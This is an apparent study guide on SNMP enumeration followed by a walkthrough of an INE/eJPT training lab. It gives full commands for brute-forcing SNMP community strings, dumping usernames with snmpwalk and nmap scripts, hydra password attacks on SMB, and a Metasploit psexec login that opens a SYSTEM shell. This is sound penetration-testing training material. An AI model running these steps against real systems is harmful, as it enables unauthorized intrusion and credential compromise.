# SNMP Enumeration Guide

## What is SNMP? (one line)

SNMP (Simple Network Management Protocol) lets admins monitor and manage network devices (routers, switches, servers) remotely.

**Think of it as:**  
"A remote control + status dashboard for network devices."

---

## 🌐 How SNMP works (visual idea)

Three parts:

1. **SNMP Manager** – the admin tool (asks questions)
2. **SNMP Agent** – runs on the device (answers)
3. **MIB** – the database of information (what can be asked)

---

## 📦 What kind of info SNMP exposes

SNMP can reveal:

* Hostname
* OS version
* Network interfaces
* IP addresses
* Running processes
* Installed software
* Routing tables
* Sometimes users & passwords (misconfigured!)

**That's why it's a goldmine for attackers.**

---

## 🔑 Community strings (VERY IMPORTANT)

SNMP uses **community strings** like passwords.

**Common defaults:**

* `public` → read-only
* `private` → read-write

If these are unchanged → **anyone can query the device**.

⚠️ **SNMPv1 & SNMPv2c use community strings in plaintext.**

---

## 🔢 SNMP versions (keep this straight)

| Version | Security |
|---------|----------|
| SNMPv1 | ❌ Insecure |
| SNMPv2c | ❌ Insecure |
| SNMPv3 | ✅ Secure (auth + encryption) |

👉 In labs, you'll mostly see **v1/v2c**.

---

## 🚪 Ports SNMP uses

* **UDP 161** → queries (GET / WALK)
* **UDP 162** → traps (alerts)

If UDP 161 is open, SNMP enumeration is possible.

---

## 🔍 How attackers test for SNMP (logic)

**Step 1: Is SNMP open?**

```bash
nmap -sU -p 161 target
```

**Step 2: Try default community strings**

```
public
private
```

If accepted → data leak.

---

## 🧪 SNMP enumeration (easy tools)

### 1️⃣ snmpwalk (most important)

```bash
snmpwalk -v2c -c public target
```

* `-v2c` → SNMP version
* `-c public` → community string

This walks the entire MIB (lots of info).

### 2️⃣ Target specific info (faster)

```bash
snmpwalk -v2c -c public target system
```

**Common useful branches:**

* `system`
* `interfaces`
* `hrSWRun` (processes)

### 3️⃣ Nmap SNMP scripts

```bash
nmap -sU -p 161 --script snmp-info target
```

Quick summary without noise.

---

## 🔥 Why SNMP is dangerous (security view)

Misconfigured SNMP can:

* Leak internal network layout
* Reveal usernames
* Show running services
* Aid lateral movement
* Enable DoS (with write access)

**In real breaches, SNMP is often the first recon step.**

---

## 🧠 Exam mindset (INE / eJPT)

If you see:

* UDP 161 open
* SNMP mentioned in hints

👉 **Immediately try:**

```bash
snmpwalk -v2c -c public target
```

**INE labs are literal.**
---
# SNMP Enumeration to SMB Exploitation Lab Walkthrough

## Big Picture (Before Steps)

This lab follows this logic:

```
Is the machine alive?
→ What services are running?
→ Is SNMP exposed?
→ Leak information using SNMP
→ Use leaked usernames
→ Attack SMB with weak passwords
→ Get a shell
→ Read the flag
```

**You are not exploiting SNMP directly** — you are using SNMP to collect intelligence, then attacking SMB.

---

## ✅ Step 1: Open the Lab (Kali GUI)

**What's happening:**

* You are given a Kali Linux machine
* This is your attacker machine

Nothing technical yet — just setup.

---

## ✅ Step 2: Check if the Target is Reachable

```bash
ping -c 5 demo.ine.local
```

**Why we do this:**

* To confirm the machine is online
* To check network connectivity
* To resolve the IP address

**Result:**

* Target replies → it is alive ✅

👉 No point attacking a dead machine.

---

## ✅ Step 3: Scan for Open Ports (TCP)

```bash
nmap demo.ine.local
```

**Why:**

* Open ports = running services
* Services = attack surface

**What you learn:**

* Several ports are open
* The machine is likely Windows
* SMB (445) is open → important later

👉 This tells you where you can attack.

---

## ✅ Step 4: Check SNMP Port (UDP 161)

```bash
nmap -sU -p 161 demo.ine.local
```

**Why this is needed:**

* SNMP uses UDP
* Nmap scans TCP by default
* You must explicitly scan UDP ports

**Result:**

* UDP port 161 is open ✅

👉 **This is critical because:**  
Open SNMP often leaks sensitive information

### ⚠️ Important Note (Why double-check)

Sometimes:

* Firewalls confuse UDP scans
* Port looks open but doesn't respond

That's why we test with real SNMP requests later.

---

## ✅ Step 5: Find SNMP Community Strings

**Simple explanation:**

* SNMP uses community strings
* They act like passwords
* Common defaults:
  * `public` (read-only)
  * `private` (read-write)

You brute-force them using:

```bash
nmap -sU -p 161 --script=snmp-brute demo.ine.local
```

**What this script does:**

* Tries many common community strings
* Uses a built-in wordlist

**Result:**

* Found:
  * `public`
  * `private`
  * `secret`

👉 **This means:**  
Anyone can talk to SNMP without real authentication ❌

---

## ✅ Step 6: Dump SNMP Information with snmpwalk

```bash
snmpwalk -v 1 -c public demo.ine.local
```

**What this means:**

* `-v 1` → SNMP version 1
* `-c public` → use the community string
* `snmpwalk` → walk through SNMP database

**What happens:**

* The server starts dumping internal information
* OS info, users, processes, services, etc.

**Problem:**

* Output is huge and messy
* Hard to manually analyze

👉 So we use smarter tools next.

---

## ✅ Step 7: Use Nmap SNMP Scripts (Clean Output)

```bash
nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
```

**Why this is better:**

* Scripts extract specific information
* Much easier to read
* Saves output to a file

**What you learn from the results:**

* Running processes
* Installed software
* Windows usernames ✅

👉 **This is the BIG WIN from SNMP.**

---

## ✅ Step 8: Attack SMB Using Leaked Usernames

From SNMP output, you find users like:

* administrator
* admin

You save them into:

```bash
users.txt
```

Now you attack SMB:

```bash
hydra -L users.txt -P unix_passwords.txt demo.ine.local smb
```

**Why this works:**

* SMB allows authentication attempts
* Passwords are weak
* You already know valid usernames

**Result:**

* Valid passwords found 🎉

👉 This is credential compromise, not exploitation.

---

## ✅ Step 9: Get a Shell Using Metasploit (PSExec)

Now that you have:

* Valid admin username
* Valid admin password

You use:

```bash
use exploit/windows/smb/psexec
```

**Why PSExec works:**

* Windows trusts administrators
* SMB allows remote command execution
* Metasploit installs a temporary service

You set:

```bash
set RHOSTS demo.ine.local
set SMBUSER administrator
set SMBPASS elizabeth
exploit
```

**Result:**

* Meterpreter session opened
* Privilege: SYSTEM (highest)

👉 **You fully own the machine now.**

---

## ✅ Step 10: Read the Flag

```bash
shell
cd C:\
type FLAG1.txt
```

**Why this works:**

* SYSTEM can read any file
* The flag is placed in root directory

🎉 **Flag captured**

---

## 🧠 What You Actually Learned (Important)

* SNMP is an information leak service
* Default SNMP configs are dangerous
* Enumeration → exploitation
* SNMP → usernames
* SMB → passwords
* Passwords → SYSTEM shell
---

# Lab

https://prinugupta.medium.com/host-network-penetration-testing-network-based-attacks-ctf-1-ejpt-ine-182f86671b52
